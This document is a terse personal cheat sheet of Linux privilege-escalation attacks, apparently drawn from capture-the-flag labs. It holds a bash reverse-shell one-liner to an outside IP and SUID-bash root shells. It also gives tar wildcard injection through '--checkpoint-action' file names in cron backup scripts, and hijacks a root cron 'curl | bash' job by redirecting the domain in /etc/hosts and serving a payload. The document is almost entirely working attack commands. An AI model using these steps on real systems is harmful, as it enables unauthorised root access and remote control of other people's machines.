1. Reverse shell 

#!/bin/bash
bash -i >& /dev/tcp/10.8.49.186/1337 0>&1

2. PATH environment variable

#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

GET rootshell with -p
#/tmp/rootbash -p

3. Wildcards 

#!/bin/bash
cd /home/usr
tar czf /tmp/backup.tar.gz * 

--checkpoint is the tar flag

So, create checkpoint first
#touch /home/user/--checkpoint=1
#touch /home/user/--checkpoint-action=exec=shell.sh

So,final command is like. ( we just inject the payload in the place of *(wild-card))
tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint=action=shell.sh


4.Wildcard injection (backup.sh , that is running in cronjob)
--------------------------------------------------------------
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

The script used "wildcard" to backup files in document folder.

In /home/server-management/Documents

#echo "chmod +s /bin/bash" > shell.sh
#echo "" > "--checkpoint-action=exec=sh shell.sh"
#echo "" > --checkpoint=1
____________________________________________________________________________________________________________________________
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

#cd /var/www/html
#printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
#echo "" > "--checkpoint-action=exec=sh shell.sh"
#echo "" > --checkpoint=1

when you remove 
#rm -rf /var/www/html/--checkpoint=1
____________________________________________________________________________________________________________________________

# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

/etc/host file is writeable so set our ip with overpass.thm(domain)
10.4.52.17 overpass.thm

#ping overpass.thm (it is reachable)

Create a folder like in crontab
#mkdir -p www/downloads/src
#subl buildscript.sh

#!/bin/bash
chmod +s /bin/bash

Return back to www directory
victor@kali:/www$ sudo python3 -m http.server 80

in victim machine
------------------
#watch ls -al /bin/bash (bash file changes into suid file after connected to attacker server)







